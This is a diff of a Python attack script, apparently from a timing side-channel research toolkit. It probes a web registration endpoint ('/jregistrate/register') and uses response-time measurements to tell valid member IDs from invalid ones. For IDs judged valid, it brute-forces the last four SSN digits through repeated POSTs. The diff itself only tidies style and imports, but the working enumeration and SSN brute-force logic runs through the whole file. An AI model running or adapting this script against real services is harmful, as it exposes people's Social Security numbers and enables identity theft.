@@ -2,40 +2,23 @@
 #-*- mode: Python;-*-
 
 import sys
-import os
 import time
 import random
-import tempfile
-import argparse
 import socket
-import json
 import functools
-try:
-    import requests
-except:
-    sys.stderr.write('ERROR: Could not import requests module.  Ensure it is installed.\n')
-    sys.stderr.write('       Under Debian, the package name is "python3-requests"\n.')
-    sys.exit(1)
+import argparse
+import requests
+import tempfile
 
-VERSION = "{DEVELOPMENT}"
-if VERSION == "{DEVELOPMENT}":
-    script_dir = '.'
-    try:
-        script_dir = os.path.dirname(os.path.realpath(__file__))
-    except:
-        try:
-            script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
-        except:
-            pass
-    sys.path.append("%s/../../trunk/lib" % script_dir)
-
-from nanownlib import *
-from nanownlib.train import *
 import nanownlib.storage
 
+from nanownlib.platform import setCPUAffinity, setTCPTimestamps
+from nanownlib.train import classifiers
+from nanownlib import (startSniffer, stopSniffer, associatePackets,
+                       analyzeProbes)
 
-parser = argparse.ArgumentParser(
-    description="")
+
+parser = argparse.ArgumentParser(description="")
 parser.add_argument('session_data', default=None,
                     help='Database file storing session information')
 parser.add_argument('host', default=None,
@@ -47,6 +30,7 @@ parser.add_argument('guess', nargs='?', type=str, default=None,
 options = parser.parse_args()
 
 
+# TODO: Add option for protocol
 hostname = options.host
 port = options.port
 protocol = 'http'
@@ -66,9 +50,9 @@ def extractReportedRuntime(headers, body):
 def sendRequest(data=None):
     method = 'POST'
     path = '/jregistrate/register'
-    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
-    headers = {"Content-Type":"application/x-www-form-urlencoded"}
-    body = (b'member_id='+data.encode('utf-8')+b'&last_four=1111&username=bob&password=1234&conf_pwd=4321')
+    url = "%s://%s:%d%s" % (protocol, hostname, port, path)
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    body = b'member_id=' + data.encode('utf-8') + b'&last_four=1111&username=bob&password=1234&conf_pwd=4321'
     req = requests.Request(method, url, headers=headers, data=body).prepare()
 
     retry = True
@@ -83,16 +67,15 @@ def sendRequest(data=None):
             time.sleep(1.0)
             sys.stderr.write("ERROR: retrying...\n")
         
-    return {'userspace_rtt':response.elapsed.microseconds*1000,
-            'reported':reported,
-            'local_port':response.raw._original_response.local_address[1]}
+    return {'userspace_rtt': response.elapsed.microseconds*1000,
+            'reported': reported,
+            'local_port': response.raw._original_response.local_address[1]}
 
 
 def fetch(probedata, data):
     #   http://docs.python-requests.org/en/latest/api/#requests.Response
     result = sendRequest(data)
     result.update(probedata)
-    
     return result
 
 
@@ -105,9 +88,9 @@ def findMaxSampleID(db):
 def guessSSN(member_id, last_four):
     method = 'POST'
     path = '/jregistrate/register'
-    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
-    headers = {"Content-Type":"application/x-www-form-urlencoded"}
-    body = (b'member_id='+member_id.encode('utf-8')+b'&last_four='+last_four.encode('utf-8')+b'&username=bob&password=1234&conf_pwd=4321')
+    url = "%s://%s:%d%s" % (protocol, hostname, port, path)
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    body = b'member_id='+member_id.encode('utf-8')+b'&last_four='+last_four.encode('utf-8')+b'&username=bob&password=1234&conf_pwd=4321'
     req = requests.Request(method, url, headers=headers, data=body).prepare()
     session = requests.Session()
     response = session.send(req, verify=False)
@@ -124,10 +107,10 @@ def bruteSSN(member_id):
     
     for last_four in range(9999):
         ssn = "%4d" % last_four
-        wt.addJob(ssn, (member_id,ssn))
+        wt.addJob(ssn, (member_id, ssn))
 
     for i in range(9999):
-        ssn,success = wt.resultq.get()
+        ssn, success = wt.resultq.get()
         if success:
             wt.stop()
             return ssn
@@ -138,19 +121,21 @@ def bruteSSN(member_id):
 
 setCPUAffinity()
 setTCPTimestamps()
-host_ip = socket.gethostbyname(hostname) #XXX: what about multiple A records?
+
+#XXX: what about multiple A records?
+host_ip = socket.gethostbyname(hostname)
 db = nanownlib.storage.db(options.session_data)
 
-cases = {"invalid":"0012-9999"}
-guesses = [("0012-%04d"%id) for id in range(0,9999) if id != 2019]
+cases = {"invalid": "0012-9999"}
+guesses = [("0012-%04d" % id) for id in range(0, 9999) if id != 2019]
 random.shuffle(guesses)
 num_observations = 250
-trim = (0,0)
+trim = (0, 0)
 classifier = "quadsummary"
 params = {"distance": 5, "threshold": 18761.53575}
 classifierTest = functools.partial(classifiers[classifier]['test'], params, True)
 
-if options.guess != None:
+if options.guess is not None:
     guesses = [options.guess]
 
 sid = findMaxSampleID(db) + 1
@@ -167,18 +152,20 @@ for guess in guesses:
 
     for obs in range(num_observations):
         random.shuffle(sample_order)
-        now = int(time.time()*1000000000)
+        now = int(time.time() * 1000000000)
         
         results = []
         for i in range(len(sample_order)):
-            results.append(fetch({'sample':sid, 'test_case':sample_order[i][0],
-                                  'type':stype, 'tc_order':i, 'time_of_day':now},
+            results.append(fetch({'sample': sid, 'test_case': sample_order[i][0],
+                                  'type': stype, 'tc_order': i,
+                                  'time_of_day': now},
                                  sample_order[i][1]))
         db.addProbes(results)
         db.conn.commit()
         sid += 1
 
-    time.sleep(2.0) # Give sniffer a chance to collect remaining packets
+    # Give sniffer a chance to collect remaining packets
+    time.sleep(2.0)
     stopSniffer(sniffer)
     associatePackets(sniffer_fp, db)
     sniffer_fp.close()
@@ -187,7 +174,7 @@ for guess in guesses:
     if classifierTest(db.subseries(stype, "valid")):
         print("  Looks valid...")
         ssn = bruteSSN(guess)
-        if ssn == None:
+        if ssn is None:
             print("  Hmm, didn't find an SSN... ")
         else:
             print("  W00t! Found SSN: %s" % ssn)
